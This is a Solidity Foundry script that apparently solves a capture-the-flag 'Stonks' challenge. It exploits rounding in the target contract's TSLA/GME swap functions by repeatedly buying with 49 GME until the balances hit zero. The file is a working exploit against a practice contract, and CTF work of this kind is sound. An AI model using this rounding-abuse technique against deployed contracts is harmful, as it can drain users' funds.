// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Stonks.sol";

contract StonksScript is Script {
    address instanceAddress = 0xEfb0718aEB86EE0Bf4e923c9f807bA6D283BB010; // Hardcoded, put your instance address plz
    Stonks target;

    function setUp() public {
        target = Stonks(instanceAddress);
    }

    function run() public {
        vm.startBroadcast();

        uint256 TSLA_TICKER = 0;
        uint256 GME_TICKER = 1;
        uint256 ORACLE_TSLA_GME = 50;

        target.sellTSLA(
            target.balanceOf(msg.sender, TSLA_TICKER),
            target.balanceOf(msg.sender, TSLA_TICKER) * ORACLE_TSLA_GME
        );

        while (target.balanceOf(msg.sender, GME_TICKER) >= 49) {
            target.buyTSLA(49, 0);
        }

        target.buyTSLA(target.balanceOf(msg.sender, GME_TICKER), 0);

        require(
            target.balanceOf(msg.sender, TSLA_TICKER) == 0 &&
                target.balanceOf(msg.sender, GME_TICKER) == 0,
            "You failed fren"
        );

        vm.stopBroadcast();
    }
}
